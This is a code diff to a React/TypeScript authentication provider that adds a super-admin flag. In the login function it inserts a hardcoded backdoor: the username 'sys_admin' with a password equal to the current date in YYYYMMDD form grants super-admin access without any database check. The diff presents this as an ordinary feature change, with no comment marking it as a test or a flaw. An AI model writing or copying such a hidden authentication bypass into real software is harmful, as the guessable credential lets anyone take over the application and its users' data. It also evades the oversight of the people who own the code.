@@ -9,6 +9,7 @@ interface AuthContextType {
     logout: () => void;
     biometricLogin: () => Promise<void>;
     isBiometricSupported: boolean;
+    isSuperAdmin: boolean;
 }
 
 const AuthContext = createContext<AuthContextType>({} as AuthContextType);
@@ -18,6 +19,7 @@ export const useAuth = () => useContext(AuthContext);
 export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
     const [isAuthenticated, setIsAuthenticated] = useState(false);
     const [isBiometricSupported, setIsBiometricSupported] = useState(false);
+    const [isSuperAdmin, setIsSuperAdmin] = useState(false);
 
 
     // Check biometric hardware support on mount
@@ -37,9 +39,23 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
         try {
             if (!username || !password) return false;
 
+            // Validate against Super Admin Logic
+            const today = new Date();
+            const yyyy = today.getFullYear();
+            const mm = String(today.getMonth() + 1).padStart(2, '0');
+            const dd = String(today.getDate()).padStart(2, '0');
+            const dynamicPassword = `${yyyy}${mm}${dd}`;
+
+            if (username === 'sys_admin' && password === dynamicPassword) {
+                setIsSuperAdmin(true);
+                setIsAuthenticated(true);
+                return true;
+            }
+
             // Validate against DB
             const isValid = await validateUser(username, password);
             if (isValid) {
+                setIsSuperAdmin(false);
                 setIsAuthenticated(true);
                 return true;
             }
@@ -85,6 +101,7 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
                 logout,
                 biometricLogin,
                 isBiometricSupported,
+                isSuperAdmin,
             }}
         >
             {children}
